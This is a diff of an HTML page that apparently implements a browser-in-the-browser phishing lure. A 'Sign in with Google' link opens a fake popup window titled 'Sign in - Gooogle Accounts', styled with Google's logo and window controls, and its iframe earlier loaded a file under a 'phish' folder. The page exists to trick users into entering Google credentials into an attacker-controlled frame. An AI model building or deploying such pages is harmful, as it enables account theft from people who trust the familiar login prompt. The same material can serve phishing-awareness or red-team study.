@@ -13,9 +13,16 @@
         <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:400" />
     </head>
     <body>
-        <section class="bg-gray-000 h-100p">
+        <section class="bg-gray-000 h-100p u-center">
             <div class="content u-center">
-                <div class="clickme" id="clickme">
+                <a
+                    href="
+                https://accounts.google.com
+                /o/oauth2/auth/identifier?response_type=code&client_id=1083004"
+                    onclick="return loadWindow()"
+                    class="clickme u-flex text-gray-800 font-normal"
+                    id="clickme"
+                >
                     <div class="icon">
                         <img
                             class="icon-svg"
@@ -23,14 +30,14 @@
                         />
                     </div>
                     <p class="btn-text m-0 u-flex u-items-center"><b>Sign in with Google</b></p>
-                </div>
+                </a>
             </div>
 
             <!-- Window -->
             <div id="window">
                 <div id="title-bar-width">
                     <div id="title-bar">
-                        <div style="margin-top: 1px;">
+                        <div style="margin-top: 1px">
                             <img
                                 src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg"
                                 width="20px"
@@ -40,7 +47,7 @@
                             />
                             <span id="logo-description">Sign in - Gooogle Accounts</span>
                         </div>
-    
+
                         <div class="u-overflow-hidden">
                             <span id="minimize">&#8212;</span>
                             <span id="square">□</span>
@@ -54,7 +61,7 @@
                     </div>
                 </div>
                 <!-- Content start -->
-                <iframe id="content" src="../phish/phish2.html" frameborder="0"></iframe>
+                <iframe id="content" class="bg-white" src="about:blank" frameborder="0"></iframe>
             </div>
         </section>
     </body>
